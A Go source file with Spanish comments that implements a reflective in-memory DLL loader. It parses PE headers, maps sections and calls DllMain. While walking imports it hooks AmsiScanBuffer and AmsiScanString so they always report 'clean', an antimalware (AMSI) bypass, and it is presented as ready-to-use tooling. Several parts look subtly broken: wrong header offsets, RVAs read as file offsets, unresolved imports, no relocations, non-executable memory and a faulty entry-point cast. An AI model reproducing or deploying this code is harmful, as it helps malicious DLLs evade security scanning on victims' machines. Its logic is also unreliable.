package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"io/ioutil"
	"syscall"
	"unsafe"
)

// Estructuras PE simplificadas
type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uintptr
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uintptr
	SizeOfStackCommit           uintptr
	SizeOfHeapReserve           uintptr
	SizeOfHeapCommit            uintptr
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}
type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type IMAGE_IMPORT_DESCRIPTOR struct {
	OriginalFirstThunk uint32
	TimeDateStamp      uint32
	ForwarderChain     uint32
	Name               uint32
	FirstThunk         uint32
}

var (
	kernel32       = syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc   = kernel32.NewProc("VirtualAlloc")
	virtualProtect = kernel32.NewProc("VirtualProtect")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_READWRITE         = 0x04
	PAGE_EXECUTE_READWRITE = 0x40
)

// Función para cargar la DLL en memoria
func loadDLLToMemory(dllPath string) ([]byte, error) {
	data, err := ioutil.ReadFile(dllPath)
	if err != nil {
		return nil, err
	}
	return data, nil
}

// Función para parsear los headers PE
func parsePEHeaders(data []byte) (*IMAGE_DOS_HEADER, *IMAGE_NT_HEADERS, error) {
	reader := bytes.NewReader(data)
	dosHeader := &IMAGE_DOS_HEADER{}
	err := binary.Read(reader, binary.LittleEndian, dosHeader)
	if err != nil {
		return nil, nil, err
	}
	if dosHeader.E_magic != 0x5A4D { // "MZ"
		return nil, nil, fmt.Errorf("invalid DOS header magic")
	}

	reader.Seek(int64(dosHeader.E_lfanew), io.SeekStart)
	ntHeaders := &IMAGE_NT_HEADERS{}
	err = binary.Read(reader, binary.LittleEndian, ntHeaders)
	if err != nil {
		return nil, nil, err
	}
	if ntHeaders.Signature != 0x00004550 { // "PE\0\0"
		return nil, nil, fmt.Errorf("invalid NT headers signature")
	}
	return dosHeader, ntHeaders, nil
}

// Función para reservar memoria
func virtualAllocMemory(size uintptr) (uintptr, error) {
	addr, _, err := virtualAlloc.Call(0, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if addr == 0 {
		return 0, err
	}
	return addr, nil
}

// Función para copiar secciones
func copySections(data []byte, ntHeaders *IMAGE_NT_HEADERS, baseAddress uintptr) error {
	reader := bytes.NewReader(data)
	for i := 0; i < int(ntHeaders.FileHeader.NumberOfSections); i++ {
		sectionHeader := &IMAGE_SECTION_HEADER{}
		reader.Seek(int64(unsafe.Sizeof(IMAGE_DOS_HEADER{})+uint32(ntHeaders.OptionalHeader.SizeOfHeaders)+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))), io.SeekStart)
		err := binary.Read(reader, binary.LittleEndian, sectionHeader)
		if err != nil {
			return err
		}
		dest := baseAddress + uintptr(sectionHeader.VirtualAddress)
		src := data[sectionHeader.PointerToRawData : sectionHeader.PointerToRawData+sectionHeader.SizeOfRawData]
		copy((*[1 << 30]byte)(unsafe.Pointer(dest))[:sectionHeader.SizeOfRawData], src)
	}
	return nil
}

// Función para resolver importaciones
func resolveImports(data []byte, ntHeaders *IMAGE_NT_HEADERS, baseAddress uintptr) error {
	importDir := ntHeaders.OptionalHeader.DataDirectory[1] // Import Directory
	if importDir.VirtualAddress == 0 {
		return nil // No import directory
	}

	importDesc := &IMAGE_IMPORT_DESCRIPTOR{}
	reader := bytes.NewReader(data)
	reader.Seek(int64(importDir.VirtualAddress), io.SeekStart)
	for {
		err := binary.Read(reader, binary.LittleEndian, importDesc)
		if err != nil {
			return err
		}
		if importDesc.Name == 0 {
			break
		}

		dllName := readString(data, int(importDesc.Name))
		dllHandle, err := syscall.LoadLibrary(dllName)
		if err != nil {
			return err
		}

		thunk := baseAddress + uintptr(importDesc.FirstThunk)
		for {
			funcNamePtr := (*uint32)(unsafe.Pointer(thunk))
			if *funcNamePtr == 0 {
				break
			}
			if *funcNamePtr&0x80000000 == 0 { // Check if it's an ordinal or not
				funcName := readString(data, int(*funcNamePtr+2)) // Skip the hint
				if funcName == "AmsiScanBuffer" || funcName == "AmsiScanString" {
					hookAddr, err := getHookFunctionAddress(funcName)
					if err != nil {
						return err
					}
					*(*uintptr)(unsafe.Pointer(thunk)) = hookAddr
				}
			}
			thunk += unsafe.Sizeof(uintptr(0))
		}
	}
	return nil
}

func readString(data []byte, offset int) string {
	for i := offset; i < len(data); i++ {
		if data[i] == 0 {
			return string(data[offset:i])
		}
	}
	return ""
}

func getHookFunctionAddress(funcName string) (uintptr, error) {
	switch funcName {
	case "AmsiScanBuffer":
		return syscall.NewCallback(hookAmsiScanBuffer), nil
	case "AmsiScanString":
		return syscall.NewCallback(hookAmsiScanString), nil
	default:
		return 0, fmt.Errorf("hook function not found for %s", funcName)
	}
}

// Implementación del hook para AmsiScanBuffer
func hookAmsiScanBuffer(buffer uintptr, length uint32, context uintptr) uint32 {
	fmt.Println("AmsiScanBuffer hook called")
	return 0 // AMSI_RESULT_CLEAN
}

// Implementación del hook para AmsiScanString
func hookAmsiScanString(buffer uintptr, length uint32, context uintptr) uint32 {
	fmt.Println("AmsiScanString hook called")
	return 0 // AMSI_RESULT_CLEAN
}

// Función para ejecutar DllMain
func callDllMain(baseAddress uintptr, ntHeaders *IMAGE_NT_HEADERS) error {
	dllMain := baseAddress + uintptr(ntHeaders.OptionalHeader.AddressOfEntryPoint)
	dllMainFunc := *(*func(uintptr, uint32, uintptr) int)(unsafe.Pointer(&dllMain))
	ret := dllMainFunc(baseAddress, 1 /* DLL_PROCESS_ATTACH */, 0)
	if ret == 0 {
		return fmt.Errorf("DllMain returned error")
	}
	return nil
}

func main() {
	// Ejemplo de uso
	dllPath := "path/to/your/dllfile.dll"
	dllBytes, err := loadDLLToMemory(dllPath)
	if err != nil {
		fmt.Printf("Error al cargar la DLL en memoria: %v\n", err)
		return
	}

	dosHeader, ntHeaders, err := parsePEHeaders(dllBytes)
	if err != nil {
		fmt.Printf("Error al parsear los headers PE: %v\n", err)
		return
	}

	baseAddress, err := virtualAllocMemory(uintptr(ntHeaders.OptionalHeader.SizeOfImage))
	if err != nil {
		fmt.Printf("Error al reservar memoria: %v\n", err)
		return
	}

	err = copySections(dllBytes, ntHeaders, baseAddress)
	if err != nil {
		fmt.Printf("Error al copiar las secciones: %v\n", err)
		return
	}

	err = resolveImports(dllBytes, ntHeaders, baseAddress)
	if err != nil {
		fmt.Printf("Error al resolver las importaciones: %v\n", err)
		return
	}

	err = callDllMain(baseAddress, ntHeaders)
	if err != nil {
		fmt.Printf("Error al ejecutar DllMain: %v\n", err)
		return
	}

	fmt.Printf("DLL copiada, importaciones resueltas y DllMain ejecutado en la dirección: 0x%x\n", baseAddress)
}
